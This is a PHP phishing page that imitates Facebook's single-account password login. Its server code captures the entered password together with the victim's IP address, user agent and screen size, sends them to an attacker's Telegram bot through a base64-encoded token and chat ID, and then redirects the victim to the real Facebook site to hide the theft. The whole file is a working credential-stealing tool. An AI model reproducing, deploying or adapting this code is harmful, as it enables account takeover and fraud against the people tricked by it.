<?php
session_start();

// تشفير وفك تشفير البيانات
function encrypt($data, $key) {
    return base64_encode(openssl_encrypt($data, 'AES-128-ECB', $key));
}

function decrypt($data, $key) {
    return openssl_decrypt(base64_decode($data), 'AES-128-ECB', $key);
}

// المفاتيح المشفرة
$encryptedToken = "NzU5MzQwOTA2MTpBQUhFUENUQ0x0dnhhQVdjRXltNzlnTDh1ZUhSQjd0dkRYZw==";
$encryptedChatID = "NjAxNTIxNTY3NA==";

// فك التشفير
$key = 'your-secret-key'; // يجب أن يكون هذا المفتاح آمناً ويتم تخزينه بشكل آمن
$TOKEN = decrypt($encryptedToken, $key);
$CHAT_ID = decrypt($encryptedChatID, $key);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['pass'];

    if (empty($password)) {
        echo "<script>alert('Please enter your password.');</script>";
        exit;
    }

    // الحصول على معلومات الجهاز
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $platform = php_uname('s');
    $screenWidth = isset($_POST['screenWidth']) ? $_POST['screenWidth'] : 'Unknown';
    $screenHeight = isset($_POST['screenHeight']) ? $_POST['screenHeight'] : 'Unknown';
    $deviceType = preg_match('/mobile/i', $userAgent) ? 'Mobile' : 'Computer';

    $message = "
<b>New Login Attempt</b>
<b>Password:</b> $password
<b>IP Address:</b> $ip
<b>Device Type:</b> $deviceType
<b>Platform:</b> $platform
<b>User Agent:</b> $userAgent
<b>Screen Resolution:</b> {$screenWidth}x{$screenHeight}
    ";

    // إرسال البيانات إلى Telegram باستخدام cURL
    $url = "https://api.telegram.org/bot$TOKEN/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'parse_mode' => 'html',
        'text' => $message
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        echo "<script>alert('Failed to send data. Please try again.');</script>";
    } else {
        header("Location: https://www.facebook.com/");
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log into Facebook</title>
    <style>
        /* CSS styles here */
    </style>
</head>
<body>
    <div id="globalContainer">
        <div class="fb_content">
            <div class="_4-u5 _30ny">
                <div class="_97vy">
                    <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
                </div>
                <div class="_4-u2 _1w1t _4-u8 _52jv">
                    <div class="_85el">
                        <div class="_6a _2pin">
                            <img class="_2qgu _9ay0 _1m9m img" src="./Log/pic.php" alt="Profile Picture" />
                        </div>
                        <div class="_2phz">
                            <span class="_50f6">
                                Log in as Chichong King
                                <svg viewBox="0 0 12 13" width="16" height="16" fill="blue" style="vertical-align: middle; margin-left: 5px;">
                                    <title>Verified account</title>
                                    <g fill-rule="evenodd" transform="translate(-98 -917)">
                                      <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
                                    </g>
                                </svg>
                            </span>
                        </div>
                        <div class="fsm fwn fcg">Chichong King<span role="presentation" aria-hidden="true"> · </span><a id="not_me_link" href="/login/notme/">Not you?</a></div>
                    </div>

                    <div class="login_form_container">
                        <form id="login-form" action="" method="post">
                            <div id="loginform">
                                <div class="clearfix _5466 _44mg">
                                    <div>
                                        <div class="_55r1 _1kbt">
                                            <input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass" id="password" placeholder="Password" autocomplete="current-password" aria-label="Password" />
                                        </div>
                                    </div>
                                </div>
                                <div class="_xkt">
                                    <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" type="submit">Log In</button>
                                </div>
                                <div class="_xkt">
                                    <a role="button" class="_42ft _4jy0 _al4m _4jy6 _517h _51sy" name="tryanotherway" href="/recover/initiate/">Try another way</a>
                                </div>
                                <div class="_xkv fsm fwn fcg" id="login_link">
                                    <a href="https://www.facebook.com/recover/initiate/" class="_97w4">Forgot account?</a>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>